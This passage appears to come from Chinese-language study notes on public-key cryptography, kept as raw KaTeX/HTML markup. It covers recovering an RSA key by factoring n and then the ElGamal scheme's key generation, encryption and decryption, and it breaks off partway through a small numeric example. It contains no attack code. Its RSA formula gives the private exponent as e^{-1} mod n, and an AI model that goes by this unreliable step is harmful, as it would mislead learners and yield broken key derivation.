class="katex-mathml"><math><semantics><mrow><mi>e</mi><mo separator="true">,</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">e, n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span></span></span></span>。</p><p>在这种情况下我们就需要对<code>n</code>进行分解。分解出<code>p,q</code>后，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)=(p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>也就知道了，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo>=</mo><msup><mi>e</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">d=e^{-1}\ mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">n</span></span></span></span>也就知道了。就可以解密了。但是分解素数不是这么简单的。</p><p>此内容之后填充。</p><ol><li><h2 id="elgmal"><a class="markdownIt-Anchor" href="#elgmal"></a> Elgmal</h2><p>此密码和之后的椭圆曲线密码一样，都基于离散对数问题 <code>Discrete Logarithm Problem DLP</code>。</p><h3 id="公钥与私钥的产生"><a class="markdownIt-Anchor" href="#公钥与私钥的产生"></a> 公钥与私钥的产生</h3><ol><li>产生一个大素数p</li><li>选择<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">Z_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>的一个生成元g。（大概就是g的幂能够遍历<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">Z_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></li><li>选择一个随机数a, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo>≤</mo><mi>a</mi><mo>≤</mo><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0\leq a\leq p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li><li>计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>β</mi><mo>=</mo><msup><mi>g</mi><mi>a</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">\beta = g^a\ mod \ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span></li><li>公钥为(p,g,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>)</li><li>私钥为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span></li></ol><h3 id="加密过程"><a class="markdownIt-Anchor" href="#加密过程"></a> 加密过程</h3><ol><li>选择一个随机数k，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo>≤</mo><mi>k</mi><mo>≤</mo><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0\leq k\leq p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li><li>如果要加密消息<code>m</code></li><li>则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>g</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c_1=g^k(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mo stretchy="false">(</mo><mi>β</mi><msup><mo stretchy="false">)</mo><mi>k</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c_2=m(\beta)^k(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></li></ol><h3 id="解密过程"><a class="markdownIt-Anchor" href="#解密过程"></a> 解密过程</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>c</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mi>a</mi></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">m=c_2((c_1)^a)^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="解密原理"><a class="markdownIt-Anchor" href="#解密原理"></a> 解密原理</h3><p>因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mo stretchy="false">(</mo><mi>β</mi><msup><mo stretchy="false">)</mo><mi>k</mi></msup><mo>=</mo><mi>m</mi><msup><mi>g</mi><mrow><mi>a</mi><mi>k</mi></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c_2=m(\beta)^k=mg^{ak}(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></p><p>又<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mi>a</mi></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mrow><mi>a</mi><mi>k</mi></mrow></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">((c_1)^a)^{-1}=(g^{ak})^{-1}(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></p><p>故<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>c</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mi>a</mi></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">m=c_2((c_1)^a)^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><ol><li><p>p=97, g=5, 选择的随机数为a=58, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>β</mi><mo>=</mo><msup><mi>g</mi><mi>a</mi></msup><mo>=</mo><msup><mn>5</mn><mn>58</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo stretchy="false">)</mo><mo>=</mo><mn>44</mn></mrow><annotation encoding="application/x-tex">\beta=g^a=5^{58}(mod\ 97)=44</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span></span></span></span>（这一步需要用到平方乘算法，计算量较大</p></li><li><p>于是(97, 5, 44)便为公钥，大家可以利用公钥来进行加密。58为私钥，只有知道私钥的人才可以解密。</p></li><li><p>假设需要加密m=3，再选择一个随机数k=36。</p><p>则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>g</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mn>5</mn><mn>36</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo stretchy="false">)</mo><mo>=</mo><mn>50</mn></mrow><annotation encoding="application/x-tex">c_1=g^k(mod\ p)=5^{36}(mod\ 97)=50</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span 